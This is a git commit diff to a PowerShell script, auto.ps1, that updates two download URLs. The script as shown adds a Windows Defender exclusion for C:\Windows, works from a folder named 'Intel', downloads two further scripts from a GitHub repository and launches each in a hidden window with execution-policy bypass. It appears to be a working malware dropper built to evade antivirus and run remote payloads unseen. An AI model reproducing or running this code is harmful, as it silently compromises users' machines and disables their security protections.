91535c586b9b352acab6522534bb861805622b2d
Alinsmekeru <113843071+Alinsmekeru@users.noreply.github.com>
2024-09-14 18:42:16 +0300

    Update auto.ps1

--- auto.ps1
+++ auto.ps1
@@ -3,13 +3,13 @@ Add-MpPreference -ExclusionPath "C:\Windows"
 
 cd "$env:UserProfile\Intel" 
 
-Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/Alinsmekeru/Intel/main/tas.ps1' -O "$env:UserProfile\Intel\tas.ps1"
+Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/Alinsmekeru/Intel3/main/tas.ps1' -O "$env:UserProfile\Intel\tas.ps1"
 
 cmd /c PowerShell -NoProfile -ExecutionPolicy Bypass -Command "& {Start-Process PowerShell -ArgumentList '-W Hidden -NoProfile -ExecutionPolicy Bypass -File ""$env:UserProfile\Intel\tas.ps1""'}"
 
 timeout /t 4 /nobreak
 
-Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/Alinsmekeru/Intel/main/vn.ps1' -O vn.ps1
+Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/Alinsmekeru/Intel3/main/vn.ps1' -O vn.ps1
 
 cmd /c PowerShell -NoProfile -ExecutionPolicy Bypass -Command "& {Start-Process PowerShell -ArgumentList '-W Hidden -NoProfile -ExecutionPolicy Bypass -File ""$env:UserProfile\Intel\vn.ps1""'}"
 
